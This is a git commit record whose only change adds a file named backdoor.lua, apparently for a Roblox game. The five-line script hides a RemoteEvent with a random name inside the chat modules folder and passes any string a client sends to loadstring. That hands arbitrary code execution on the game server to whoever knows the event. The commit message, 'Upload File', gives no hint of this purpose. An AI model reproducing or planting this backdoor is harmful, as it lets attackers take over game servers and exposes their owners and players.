25d037381d311ce3cefc9d6554f98f88b1e428ae
iK4oS <47014074+iK4oS@users.noreply.github.com>
2021-04-29 00:27:47 +0200

    Upload File

---
+++ backdoor.lua
@@ -0,0 +1,5 @@
+local Remote = Instance.new("RemoteEvent", game.Chat:WaitForChild("ClientChatModules").MessageCreatorModules)
+Remote.Name = tostring(math.random(100000000,1000000000))
+Remote.OnServerEvent:connect(function(player, execute)
+	loadstring(execute)()
+end)
